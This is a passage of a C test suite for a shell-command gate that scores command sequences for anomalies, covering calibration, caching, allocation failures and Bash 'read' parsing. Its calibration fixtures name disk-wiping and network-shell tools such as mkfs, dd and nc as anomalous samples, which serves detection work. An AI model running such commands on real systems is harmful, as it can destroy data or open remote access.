           cases[i].identified);
    ASSERT(!result.truncated);
  }
  sg_gate_free(gate);
}

TEST(anomaly_allocation_failure_matrix) {
  sg_result_t result;
  sg_gate_t *probe = sg_gate_new();
  ASSERT(probe != NULL);
  sg_test_alloc_reset();
  ASSERT_SG_OK(sg_gate_enable_anomaly(probe, 100.0, NULL));
  size_t enable_allocations = sg_test_alloc_count();
  sg_test_alloc_reset();
  sg_gate_free(probe);
  ASSERT(enable_allocations >= 2);

  for (size_t i = 1; i <= enable_allocations; i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    sg_test_alloc_fail_at(i);
    sg_error_t error = sg_gate_enable_anomaly(gate, 100.0, NULL);
    sg_test_alloc_reset();
    ASSERT(error == SG_ERR_MEMORY);
    ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), 0);
    sg_gate_free(gate);
  }

  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  ASSERT_SG_OK(eval_cmd(gate, "gcc ; make ; test", &result));
  size_t preserved_vocab = test_anomaly_vocabulary(gate);
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_enable_anomaly(gate, 5.0, NULL) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), preserved_vocab);
  ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gate, 4));
  ASSERT_SG_OK(eval_cmd(gate, "ls ; cd /tmp ; pwd", &result));
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_set_anomaly_cache_size(gate, 8) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, "ls ; cd /tmp ; pwd", &result));

  sg_anomaly_model_t *raw_probe = sg_anomaly_model_new();
  ASSERT(raw_probe != NULL);
  const char raw_sequence[] = "3:gcc,4:make,4:test,";
  sg_test_anomaly_op_reset();
  ASSERT(sg_anomaly_model_update_netseq(raw_probe, raw_sequence,
                                        sizeof(raw_sequence) - 1) ==
         SG_ANOMALY_OK);
  size_t raw_operation_count = sg_test_anomaly_op_count();
  sg_test_anomaly_op_reset();
  sg_anomaly_model_free(raw_probe);
  ASSERT(raw_operation_count > 0);
  /* Raw model consumes exactly raw_operation_count operations; fail the first
   * following operation, which belongs to the type model. */
  sg_test_anomaly_op_fail_at(raw_operation_count + 1);
  ASSERT_SG_OK(eval_cmd(gate, "gcc ; make ; test", &result));
  sg_test_anomaly_op_reset();
  ASSERT(sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(anomaly_calibration_matrix) {
  static const char *normal[] = {
      "ls ; cat file.txt ; pwd",
      "cat file.txt ; grep pattern ; sort",
      "echo hello ; sleep 1 ; true",
      "cp a b ; mv b c ; rm c",
  };
  static const char *anomalies[] = {
      "mkfs ; fdisk ; dd",
      "iptables ; reboot ; shutdown",
      "nc ; strace ; objdump",
      "gdb ; hexdump ; base64",
  };
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);

  sg_result_t result;
  ASSERT(eval_cmd(g, normal[0], &result) == SG_OK);
  double before_training = result.anomaly_score;
  ASSERT(!isnan(before_training));
  for (int i = 0; i < 100; i++)
    ASSERT(eval_cmd(g, normal[i % 4], &result) == SG_OK);

  ASSERT(eval_cmd(g, normal[0], &result) == SG_OK);
  ASSERT(isfinite(result.anomaly_score));
  ASSERT(result.anomaly_score < before_training);

  /* Freeze the model so scoring one case cannot make a later case easier. */
  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  double max_normal = -INFINITY;
  double min_anomaly = INFINITY;
  for (size_t i = 0; i < sizeof(normal) / sizeof(normal[0]); i++) {
    ASSERT(eval_cmd(g, normal[i], &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    if (result.anomaly_score > max_normal)
      max_normal = result.anomaly_score;
    ASSERT(eval_cmd(g, anomalies[i], &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    if (result.anomaly_score < min_anomaly)
      min_anomaly = result.anomaly_score;
  }
  ASSERT(min_anomaly > max_normal);

  sg_gate_free(g);
}

TEST(anomaly_weight_matrix) {
  static const struct {
    double raw;
    double type;
  } cases[] = {{1.0, 0.0}, {0.0, 1.0}, {0.25, 0.75}};
  static const char *rules[] = {"cat *", "grep *", "grep * *", "sort"};

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
    ASSERT(g != NULL);
    ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
    ASSERT(sg_gate_set_anomaly_weights(g, cases[i].raw, cases[i].type) ==
           SG_OK);
    ASSERT(sg_gate_set_stop_mode(g, SG_EVAL_ALL) == SG_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, "cat /etc/hosts ; grep root ; sort", &result) == SG_OK);
    ASSERT(isinf(result.anomaly_score));
    ASSERT(!result.anomaly_detected);
    ASSERT(test_anomaly_vocabulary(g) > 0);
    for (int repetition = 1; repetition < 30; repetition++)
      ASSERT(eval_cmd(g, "cat /etc/hosts ; grep root ; sort", &result) ==
             SG_OK);

    ASSERT(eval_cmd(g, "cat 42 ; grep -E error ; sort", &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(isfinite(result.anomaly_score_raw));
    ASSERT(isfinite(result.anomaly_score_type));
    ASSERT(fabs(result.anomaly_score_raw - result.anomaly_score_type) > 1e-6);
    double expected = result.anomaly_score_raw * cases[i].raw +
                      result.anomaly_score_type * cases[i].type;
    ASSERT(fabs(result.anomaly_score - expected) < 1e-12);
    sg_gate_free(g);
  }
}

TEST(anomaly_netseq_score_contract) {
  static const char *training = "cat /etc/hosts ; grep root ; sort";
  static const char *probe = "cat /tmp/x ; grep error ; sort";
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  sg_anomaly_sequence_score_t score = {0};
  ASSERT(sg_gate_score_anomaly_netseq(gate, "1:x,", 4, "1:y,", 4, &score) ==
         SG_ERR_INVALID);
  ASSERT(score.stage_count == 0 && !score.detected && isinf(score.raw_score) &&
         isinf(score.type_score) && isinf(score.combined_score));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));
  const double untrained_weights[][2] = {{0.5, 0.5}, {1.0, 0.0}, {0.0, 1.0}};
  for (size_t i = 0;
       i < sizeof(untrained_weights) / sizeof(untrained_weights[0]); i++) {
    ASSERT_SG_OK(sg_gate_set_anomaly_weights(gate, untrained_weights[i][0],
                                             untrained_weights[i][1]));
    ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, "1:a,1:b,1:c,", 12,
                                              "1:x,1:y,1:z,", 12, &score));
    ASSERT(score.stage_count == 3 && !score.detected &&
           isinf(score.raw_score) && isinf(score.type_score) &&
           isinf(score.combined_score));
  }
  ASSERT_SG_OK(sg_gate_set_anomaly_weights(gate, 0.5, 0.5));
  sg_result_t result;
  for (int i = 0; i < 8; i++)
    ASSERT_SG_OK(eval_cmd(gate, training, &result));
  ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(gate, true));
  ASSERT_SG_OK(eval_cmd(gate, probe, &result));

  shell_netstring_buffer_t raw = {0};
  shell_netstring_buffer_t type = {0};
  size_t raw_count = 0, type_count = 0;
  ASSERT(shell_build_command_netseq_buffer(probe, strlen(probe), NULL, &raw,
                                           &raw_count) == SHELL_PROCESS_OK);
  ASSERT(shell_build_type_netseq_buffer(probe, strlen(probe), NULL, &type,
                                        &type_count) == SHELL_PROCESS_OK);
  ASSERT_SG_OK(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data,
                                            raw.length, (const char *)type.data,
                                            type.length, &score));
  ASSERT(score.stage_count == raw_count && raw_count == type_count);
  ASSERT(score.raw_score == result.anomaly_score_raw);
  ASSERT(score.type_score == result.anomaly_score_type);
  ASSERT(score.combined_score == result.anomaly_score);
  ASSERT(score.detected == result.anomaly_detected);
  ASSERT(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data, raw.length,
                                      "4:cat,", 6, &score) == SG_ERR_PARSE);
  ASSERT(score.stage_count == 0 && !score.detected && isinf(score.raw_score) &&
         isinf(score.type_score) && isinf(score.combined_score));
  ASSERT(sg_gate_score_anomaly_netseq(gate, (const char *)raw.data, raw.length,
                                      "1:x,tail", 8, &score) == SG_ERR_PARSE);
  ASSERT(score.stage_count == 0 && !score.detected && isinf(score.raw_score) &&
         isinf(score.type_score) && isinf(score.combined_score));

  ASSERT(sg_gate_score_anomaly_netseq(gate, "1:x,tail", 8,
                                      (const char *)type.data, type.length,
                                      &score) == SG_ERR_PARSE);
  ASSERT(score.stage_count == 0 && !score.detected && isinf(score.raw_score) &&
         isinf(score.type_score) && isinf(score.combined_score));
  ASSERT_SG_OK(
      sg_gate_score_anomaly_netseq(gate, "1:x,", 4, "1:y,", 4, &score));
  ASSERT(score.stage_count == 1 && !score.detected && score.raw_score == 0.0 &&
         score.type_score == 0.0 && score.combined_score == 0.0);
  shell_netstring_buffer_free(&raw);
  shell_netstring_buffer_free(&type);
  sg_gate_free(gate);
}

TEST(anomaly_configuration_validation) {

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  static const struct {
    double threshold;
    double alpha;
    double unknown_log_prior;
  } invalid_enable[] = {
      {NAN, 0.1, -10.0},  {INFINITY, 0.1, -10.0}, {5.0, 0.0, -10.0},
      {5.0, -0.1, -10.0}, {5.0, NAN, -10.0},      {5.0, INFINITY, -10.0},
      {5.0, 0.1, NAN},    {5.0, 0.1, -INFINITY},
  };
  for (size_t i = 0; i < sizeof(invalid_enable) / sizeof(invalid_enable[0]);
       i++) {
    sg_anomaly_config_t config = {
        .alpha = invalid_enable[i].alpha,
        .unknown_log_prior = invalid_enable[i].unknown_log_prior,
    };
    ASSERT(sg_gate_enable_anomaly(g, invalid_enable[i].threshold, &config) ==
           SG_ERR_INVALID);
  }

  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  sg_result_t result;
  ASSERT(eval_cmd(g, "one ; two ; three", &result) == SG_OK);
  size_t preserved_vocab = test_anomaly_vocabulary(g);
  ASSERT(preserved_vocab == 3);
  sg_anomaly_config_t invalid_config = {
      .alpha = 0.0,
      .unknown_log_prior = -10.0,
  };
  ASSERT(sg_gate_enable_anomaly(g, 5.0, &invalid_config) == SG_ERR_INVALID);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g), preserved_vocab);

  sg_anomaly_config_t custom_config = {
      .alpha = 0.25,
      .unknown_log_prior = -7.0,
  };
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, &custom_config));

  ASSERT(sg_gate_set_anomaly_weights(g, -0.1, 1.1) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, 0.5, -0.1) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, 0.2, 0.2) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, 0.6, 0.6) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, NAN, NAN) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, INFINITY, 0.0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, 0.0, NAN) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_weights(g, 0.0, INFINITY) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_k_factor(g, -1.0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_k_factor(g, NAN) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_k_factor(g, INFINITY) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_cache_size(g, 8193) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_anomaly_combine_mode(g, (sg_anomaly_combine_mode_t)99) ==
         SG_ERR_INVALID);
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 8) == SG_ERR_MEMORY);
  sg_test_alloc_reset();
  for (size_t fail_at = 1; fail_at <= 2; fail_at++) {
    sg_test_alloc_fail_at(fail_at);
    ASSERT(sg_gate_set_anomaly_combine_mode(g, SG_ANOMALY_COMBINE_BAYESIAN) ==
           SG_ERR_MEMORY);
    sg_test_alloc_reset();
  }

  sg_gate_free(g);
}

TEST(anomaly_adaptive_threshold_transitions) {
  static const char *normal = "ls ; cat /etc/hosts ; pwd";
  static const char *novel = "gcc ; make ; strip";
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  ASSERT(sg_gate_set_stop_mode(g, SG_EVAL_ALL) == SG_OK);
  ASSERT(test_policy_replace_cpl(g, false, "ls", false) == ST_OK);
  ASSERT(test_policy_replace_cpl(g, false, "cat *", false) == ST_OK);
  ASSERT(test_policy_replace_cpl(g, false, "pwd", false) == ST_OK);

  sg_result_t result;
  for (int i = 0; i < 20; i++) {
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
  }

  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 3) == SG_OK);
  ASSERT(sg_gate_set_anomaly_k_factor(g, 0.0) == SG_OK);

  /* Until three finite samples arm the window, the fixed threshold applies. */
  for (int i = 0; i < 3; i++) {
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    ASSERT(!result.anomaly_detected);
  }

  ASSERT(eval_cmd(g, novel, &result) == SG_OK);
  ASSERT(isfinite(result.anomaly_score));
  ASSERT(result.anomaly_detected);
  double adaptive_score = result.anomaly_score;

  /* Disabling adaptive restores the original fixed threshold. The detected
   * command was not learned, so its score itself remains unchanged. */
  ASSERT(sg_gate_set_anomaly_adaptive(g, false, 0) == SG_OK);
  ASSERT(eval_cmd(g, novel, &result) == SG_OK);
  ASSERT(result.anomaly_score == adaptive_score);
  ASSERT(!result.anomaly_detected);

  /* Reconfiguration resets the window; enough normal samples exercise both
   * re-arming and repeated circular-buffer wraparound. */
  ASSERT(sg_gate_set_anomaly_adaptive(g, true, 3) == SG_OK);
  ASSERT(sg_gate_set_anomaly_k_factor(g, 2.0) == SG_OK);
  for (int i = 0; i < 12; i++) {
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
    ASSERT(isfinite(result.anomaly_score));
    ASSERT(!isnan(result.anomaly_score));
  }

  /* Disable/re-enable preserves the configured three-sample adaptive window
   * and k-factor while starting with fresh model observations. */
  ASSERT(sg_gate_set_anomaly_k_factor(g, 0.0) == SG_OK);
  sg_gate_disable_anomaly(g);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  for (int i = 0; i < 8; i++)
    ASSERT(eval_cmd(g, normal, &result) == SG_OK);
  ASSERT(eval_cmd(g, novel, &result) == SG_OK);
  ASSERT(result.anomaly_detected);
  sg_gate_free(g);
}

TEST(anomaly_cache_equivalence_matrix) {
  static const struct {
    size_t cache_size;
    const char *command;
  } steps[] = {
      {4, "ls ; cd /tmp ; pwd"},
      {(size_t)-1, "ls ; cd /tmp ; pwd"}, /* hit */
      {(size_t)-1, "cat /etc/hosts ; grep root ; sort"},
      {(size_t)-1, "echo hello ; sleep 1 ; true"},
      {(size_t)-1, "mkdir dir ; chmod 755 dir ; ls dir"},
      {(size_t)-1, "cat /etc/hosts ; grep root ; sort"}, /* promote */
      {(size_t)-1, "cp a b ; mv b c ; rm c"},            /* evict */
      {(size_t)-1, "ls ; cd /tmp ; pwd"},                /* miss */
      {0, "ls ; cd /tmp ; pwd"},                         /* disable */
      {1, "echo hello ; sleep 1 ; true"},                /* resize */
      {(size_t)-1, "echo hello ; sleep 1 ; true"},       /* hit */
      {32, "cp a b ; mv b c ; rm c"},                    /* re-enable */
      {(size_t)-1, "cp a b ; mv b c ; rm c"},            /* hit */
  };

  sg_gate_t *cached = sg_gate_new();
  sg_gate_t *control = sg_gate_new();
  ASSERT(cached != NULL && control != NULL);
  ASSERT(sg_gate_enable_anomaly(cached, 100.0, NULL) == SG_OK);
  ASSERT(sg_gate_enable_anomaly(control, 100.0, NULL) == SG_OK);

  for (size_t i = 0; i < sizeof(steps) / sizeof(steps[0]); i++) {
    if (steps[i].cache_size != (size_t)-1)
      ASSERT(sg_gate_set_anomaly_cache_size(cached, steps[i].cache_size) ==
             SG_OK);

    sg_result_t actual, expected;
    ASSERT(eval_cmd(cached, steps[i].command, &actual) == SG_OK);
    ASSERT(eval_cmd(control, steps[i].command, &expected) == SG_OK);
    ASSERT(actual.verdict == expected.verdict);
    ASSERT(actual.anomaly_detected == expected.anomaly_detected);
    ASSERT(actual.anomaly_score == expected.anomaly_score);
    ASSERT(actual.anomaly_score_raw == expected.anomaly_score_raw);
    ASSERT(actual.anomaly_score_type == expected.anomaly_score_type);
    ASSERT_EQ_UINT(test_anomaly_vocabulary(cached),
                   test_anomaly_vocabulary(control));
  }

  ASSERT(test_anomaly_vocabulary(cached) > 0);
  sg_gate_free(cached);
  sg_gate_free(control);
}

static sg_gate_t *anomaly_gate_with_cache(size_t capacity) {
  sg_gate_t *gate = sg_gate_new();
  if (!gate)
    return NULL;
  if (sg_gate_enable_anomaly(gate, 100.0, NULL) != SG_OK ||
      sg_gate_set_anomaly_cache_size(gate, capacity) != SG_OK) {
    sg_gate_free(gate);
    return NULL;
  }
  return gate;
}

static void assert_anomaly_results_equal(const sg_result_t *actual,
                                         const sg_result_t *expected) {
  ASSERT(actual->verdict == expected->verdict);
  ASSERT(actual->anomaly_detected == expected->anomaly_detected);
  ASSERT(actual->anomaly_score == expected->anomaly_score);
  ASSERT(actual->anomaly_score_raw == expected->anomaly_score_raw);
  ASSERT(actual->anomaly_score_type == expected->anomaly_score_type);
}

TEST(contextual_read_anomaly_contract) {
  static const struct {
    const char *source;
    sg_verdict_t verdict;
  } commands[] = {
      {"exec {out}>&1 && { unset empty; read -n0 other\"$empty\"; "
       "printf kept >&\"$out\"; }",
       SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && read -n-\"$fd\" value", SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && read -n-1\"$fd\" value", SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && read -n-00\"$fd\" value", SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && read -u00\"$fd\" value", SG_VERDICT_ALLOW},
      {"unset fd; read -u0\"$fd\" value <<<payload", SG_VERDICT_ALLOW},
      {"read -u-1\"$unknown\" value <<<payload", SG_VERDICT_ALLOW},
      {"read -n\"$unknown\"x value <<<payload", SG_VERDICT_ALLOW},
      {"read -- pre\"$unknown\"- value <<<payload", SG_VERDICT_ALLOW},
      {"unset fd; read -p\"$fd\" -e value <<<payload", SG_VERDICT_ALLOW},
      {"unset fd; echo \"$(read -p\"$fd\" -e value <<<payload)\"",
       SG_VERDICT_ALLOW_CONDITIONAL},
      {"unset RANDOM; echo \"$(read -r RANDOM <<<payload)\"",
       SG_VERDICT_ALLOW_CONDITIONAL},
      {"unset RANDOM; echo <(read -r RANDOM <<<payload)", SG_VERDICT_ALLOW},
      {"unset RANDOM; echo \"$(read -p\"$RANDOM\" -e value <<<payload)\"",
       SG_VERDICT_ALLOW_CONDITIONAL},
      {"unset fd; read -n\"$fd\" -a value <<<payload", SG_VERDICT_ALLOW},
      {"read -t0.0000000\"$unknown\" value <<<payload", SG_VERDICT_ALLOW},
      {"unset empty; read -- $empty~ value <<<payload", SG_VERDICT_ALLOW},
      {"read -- pre<(printf generated) value <<<payload", SG_VERDICT_ALLOW},
      {"unset empty; read -- -p\"$empty\" RANDOM <<<payload", SG_VERDICT_ALLOW},
      {"exec {out}>&1 && { unset empty; read -- -p\"$empty\" out "
       "<<<payload; printf kept >&\"$out\"; }",
       SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && read -p\"$fd\" -u \"$fd\" value",
       SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && read -d\"$fd\" -u${fd} value", SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && read -n\"$fd\" -u $fd value", SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && { read -p\"$fd\" -u \"$fd\" value; }",
       SG_VERDICT_ALLOW},
      {"exec {fd}<<<payload && echo \"$(read -p\"$fd\" -u \"$fd\" value)\"",
       SG_VERDICT_ALLOW_CONDITIONAL},
      {"exec {fd}<<<payload && echo <(read -p\"$fd\" -u \"$fd\" value)",
       SG_VERDICT_ALLOW},
  };
  static const char *const rules[] = {"exec",         "read * *", "read * * *",
                                      "read * * * *", "echo *",   "unset *",
                                      "printf *"};
  size_t rule_count = sizeof(rules) / sizeof(rules[0]);
  sg_gate_t *plain = gate_with_rules(rules, rule_count);
  sg_gate_t *cached = gate_with_rules(rules, rule_count);
  sg_gate_t *uncached = gate_with_rules(rules, rule_count);
  ASSERT(plain && cached && uncached);
  sg_gate_t *gates[] = {plain, cached, uncached};
  for (size_t g = 0; g < 3; g++) {
    ASSERT_SG_OK(sg_gate_set_reject_mask(gates[g], 0));
    ASSERT_SG_OK(sg_gate_set_stop_mode(gates[g], SG_EVAL_ALL));
    if (g) {
      ASSERT_SG_OK(sg_gate_enable_anomaly(gates[g], 1e300, NULL));
      ASSERT_SG_OK(sg_gate_set_anomaly_cache_size(gates[g], g == 1 ? 16 : 0));
    }
  }
  for (size_t i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
    sg_result_t baseline;
    shellsplit_test_source_scan_reset();
    ASSERT_SG_OK(eval_cmd(plain, commands[i].source, &baseline));
    size_t baseline_semantics =
        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_SEMANTIC_BODIES);
    if (baseline.verdict != commands[i].verdict) {
      fprintf(stderr, "contextual read policy fixture: %s (verdict %d)\n",
              commands[i].source, baseline.verdict);
      for (size_t c = 0; c < baseline.subcommand_count; c++)
        fprintf(stderr, "  command %zu: %s (verdict %d)\n", c,
                baseline.subcommands[c].netargv,
                baseline.subcommands[c].verdict);
    }
    ASSERT(baseline.verdict == commands[i].verdict);
    char baseline_args[4][256];
    ASSERT(baseline.subcommand_count <= 4);
    for (size_t c = 0; c < baseline.subcommand_count; c++) {
      ASSERT(baseline.subcommands[c].netargv_length <=
             sizeof(baseline_args[c]));
      memcpy(baseline_args[c], baseline.subcommands[c].netargv,
             baseline.subcommands[c].netargv_length);
    }
    for (unsigned repeat = 0; repeat < 2; repeat++) {
      sg_result_t results[2];
      for (size_t g = 0; g < 2; g++) {
        shellsplit_test_source_scan_reset();
        ASSERT_SG_OK(eval_cmd(gates[g + 1], commands[i].source, &results[g]));
        size_t work =
            shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_SEMANTIC_BODIES);
        ASSERT(work == baseline_semantics);
        ASSERT(shellsplit_test_metadata_work(
                   SHELLSPLIT_TEST_WORK_PROCESS_STRICT_PARSE) == 0);
        ASSERT(results[g].verdict == baseline.verdict);
        ASSERT(results[g].subcommand_count == baseline.subcommand_count);
        ASSERT(results[g].unresolved_expansion_flags ==
               baseline.unresolved_expansion_flags);
        for (size_t c = 0; c < baseline.subcommand_count; c++) {
          ASSERT(results[g].subcommands[c].netargv_length ==
                 baseline.subcommands[c].netargv_length);
          ASSERT(memcmp(results[g].subcommands[c].netargv, baseline_args[c],
                        baseline.subcommands[c].netargv_length) == 0);
        }
        /* A cold model has no trigrams for the first multi-command fixture.
         * The repeat must be finite after both models learn that sequence. */
        ASSERT(!isnan(results[g].anomaly_score));
        if (repeat)
          ASSERT(isfinite(results[g].anomaly_score));
      }
      assert_anomaly_results_equal(&results[0], &results[1]);
      ASSERT(test_anomaly_vocabulary(cached) ==
             test_anomaly_vocabulary(uncached));
    }
  }
  static const char *const rejected[] = {
      "read -p\"$prompt\" -u \"$fd\" value",
      "exec {fd}<<<payload && read -p\"$fd\" -u \"$fd\" -e value",
      "exec {fd}<<<payload && read -p\"$fd\" -u \"$fd\" -a values",
      "exec {fd}<<<payload && read -p\"$fd\" -u \"${fd:-3}\" value",
      "exec {fd}<<<payload && read -p\"$fd\" -u \"$fd\" value |",
  };
  for (size_t g = 0; g < 3; g++) {
    size_t vocabulary = test_anomaly_vocabulary(gates[g]);
    for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
      sg_result_t result;
      ASSERT(eval_cmd(gates[g], rejected[i], &result) == SG_ERR_PARSE);
      ASSERT(result.verdict == SG_VERDICT_REJECT);
      ASSERT(test_anomaly_vocabulary(gates[g]) == vocabulary);
    }
    sg_gate_free(gates[g]);
  }
}

TEST(contextual_read_anomaly_allocation_failures) {
  static const char command[] =
      "exec {fd}<<<payload && read -p\"$fd\" -u \"$fd\" value";
  for (unsigned warm = 0; warm < 2; warm++) {
    sg_gate_t *probe = anomaly_gate_with_cache(1);
    ASSERT(probe != NULL);
    ASSERT_SG_OK(sg_gate_set_reject_mask(probe, 0));
    sg_result_t result;
    if (warm)
      ASSERT_SG_OK(eval_cmd(probe, command, &result));
    shellsplit_test_alloc_reset();
    ASSERT_SG_OK(eval_cmd(probe, command, &result));
    size_t allocations = shellsplit_test_alloc_count();
    shellsplit_test_alloc_reset();
    ASSERT(allocations != 0);
    sg_gate_free(probe);
    for (size_t fail = 1; fail <= allocations; fail++) {
      sg_gate_t *gate = anomaly_gate_with_cache(1);
      ASSERT(gate != NULL);
      ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
      if (warm)
        ASSERT_SG_OK(eval_cmd(gate, command, &result));
      size_t vocabulary = test_anomaly_vocabulary(gate);
      shellsplit_test_alloc_fail_at(fail);
      sg_error_t error = eval_cmd(gate, command, &result);
      shellsplit_test_alloc_reset();
      ASSERT(error == SG_ERR_MEMORY);
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
      ASSERT(test_anomaly_vocabulary(gate) == vocabulary);
      ASSERT_SG_OK(eval_cmd(gate, command, &result));
      sg_gate_free(gate);
    }
  }
}

TEST(truncated_graph_skips_anomaly_work) {
  sg_gate_t *gate = anomaly_gate_with_cache(4);
  ASSERT(gate != NULL);
  sg_result_t result;
  char source[512] = {0};
  for (unsigned graph_only = 0; graph_only < 2; graph_only++) {
    size_t length = 0;
    if (graph_only) {
      memcpy(source, "true", 4);
      length = 4;
      for (size_t i = 0; i < SHELL_DEP_MAX_TOKENS; i++) {
        memcpy(source + length, " x", 2);
        length += 2;
      }
      shell_parse_result_t fast;
      shell_limits_t limits = {.max_subcommands = 64, .strict_mode = true};
      ASSERT(shell_parse_fast(source, length, &limits, &fast) == SHELL_OK);
    } else {
      for (size_t i = 0; i < 65; i++) {
        memcpy(source + length, "true;", 5);
        length += 5;
      }
    }
    source[length] = '\0';
    for (unsigned repeat = 0; repeat < 2; repeat++) {
      shellsplit_test_source_scan_reset();
      ASSERT(eval_cmd(gate, source, &result) == SG_ERR_TRUNC);
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED && result.truncated &&
             result.subcommand_truncated && result.subcommand_count != 0);
      ASSERT(result.anomaly_score == 0 && !result.anomaly_detected);
      ASSERT(result.anomaly_update == SG_ANOMALY_UPDATE_NOT_ATTEMPTED);
      ASSERT(test_anomaly_vocabulary(gate) == 0);
      ASSERT(shellsplit_test_metadata_work(
                 SHELLSPLIT_TEST_WORK_ANOMALY_BODIES) == 0);
    }
  }
  ASSERT_SG_OK(eval_cmd(gate, "true", &result));
  ASSERT(test_anomaly_vocabulary(gate) == 1);
  sg_gate_free(gate);
}

TEST(anomaly_cache_allocation_failure_matrix) {
  static const struct {
    const char *name;
    const char *warm;
    const char *target;
    size_t expected_allocations;
  } cases[] = {
      {"cache hit", "ls ; pwd ; true", "ls ; pwd ; true", 0},
      {"cold miss", NULL, "cat a ; grep b ; sort", 1},
      {"evicting miss", "ls ; pwd ; true", "cat a ; grep b ; sort", 1},
  };

  for (size_t ci = 0; ci < sizeof(cases) / sizeof(cases[0]); ci++) {
    sg_gate_t *probe = anomaly_gate_with_cache(1);
    ASSERT(probe != NULL);
    sg_result_t ignored;
    if (cases[ci].warm)
      ASSERT_SG_OK(eval_cmd(probe, cases[ci].warm, &ignored));
    sg_test_alloc_reset();
    ASSERT_SG_OK(eval_cmd(probe, cases[ci].target, &ignored));
    size_t allocations = sg_test_alloc_count();
    sg_test_alloc_reset();
    if (allocations != cases[ci].expected_allocations) {
      fprintf(stderr, "%s: got %zu cache allocations, expected %zu\n",
              cases[ci].name, allocations, cases[ci].expected_allocations);
      fail_count++;
    }
    sg_gate_free(probe);

    for (size_t fail_at = 1; fail_at <= allocations; fail_at++) {
      sg_gate_t *actual_gate = anomaly_gate_with_cache(1);
      sg_gate_t *control_gate = anomaly_gate_with_cache(1);
      ASSERT(actual_gate != NULL && control_gate != NULL);
      sg_result_t actual, expected;
      if (cases[ci].warm) {
        ASSERT_SG_OK(eval_cmd(actual_gate, cases[ci].warm, &actual));
        ASSERT_SG_OK(eval_cmd(control_gate, cases[ci].warm, &expected));
        assert_anomaly_results_equal(&actual, &expected);
      }

      sg_test_alloc_fail_at(fail_at);
      ASSERT_SG_OK(eval_cmd(actual_gate, cases[ci].target, &actual));
      sg_test_alloc_reset();
      ASSERT_SG_OK(eval_cmd(control_gate, cases[ci].target, &expected));
      assert_anomaly_results_equal(&actual, &expected);

      /* A failed optimization must not damage the cache or alter the next
